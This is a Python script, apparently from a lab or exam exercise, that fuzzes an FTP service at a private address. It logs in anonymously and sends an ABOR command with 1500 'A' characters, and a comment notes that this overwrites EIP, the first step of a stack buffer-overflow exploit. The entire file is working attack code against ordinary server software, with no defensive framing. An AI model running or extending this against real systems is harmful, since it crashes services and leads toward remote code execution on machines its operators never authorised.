#!/usr/bin/env python3

import socket
import sys
import time

ip = "192.168.56.132"
port = 21
#EIP overwritten after sending 1500 chars
def fuzzer():
	global s
	counter = 1500
	array = []
	while len(array) <=30:
		array.append("A" * counter)
	for crash in array:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
		s.connect((ip,port))
		print(s.recv(1024))
		time.sleep(2)
		s.recv(2000)
		s.send(b'USER anonymous\r\n')
		print(s.recv(2000))
		s.send(b'PASS anonymous\r\n')
		print(s.recv(2000))
		s.send(bytes('ABOR ' + crash + '\r\n','latin-1'))
		print("[%d] bytes has been sent to the target \n" % len(crash))
		sys.exit()
		s.close()

def main():
	fuzzer()

main()
